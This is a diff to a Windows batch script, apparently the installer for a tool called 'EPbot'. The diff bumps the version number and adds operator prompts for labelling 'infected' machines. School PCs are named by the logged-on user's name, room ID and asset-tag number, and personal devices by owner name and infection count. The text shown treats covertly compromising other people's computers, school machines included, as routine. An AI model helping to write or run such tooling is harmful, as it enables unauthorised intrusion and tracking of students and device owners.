@@ -1,7 +1,7 @@
 :: setup
 :start
 @ECHO OFF
-set update_number=4.40.27
+set update_number=4.41.27
 set dev=0
 cls
 :VBSDynamicBuild
@@ -73,7 +73,14 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   choice /C YNM /m "does target PC have admin rights? Y/N:
   if %errorlevel% equ 1 (set target_admin_rights=true) else (if %errorlevel% equ 2 (set target_admin_rights=false) else (goto menu))
   echo.  
-  echo DO NOT USE SPACES, replace them with _
+  echo it is recomended for school computers to use this format: username_roomID_assetnumber
+  echo username is the username of whoever was logged on while infecting
+  echo roomID is the room name, expample: BF12
+  echo assetnumber can be found on a sticker on the PC you are infecting.
+  echo.
+  echo for personal devices it is recomended to use ownername_PC/laptop_infectionnumber
+  echo replace ownername with name of device owner, PC/laptop with the device type, and infectionnumber for multiple devices
+  echo DO NOT USE SPACES, replace them with _ or -
   echo.
   set /p opt1=Device name:
   echo where would you like to create the files
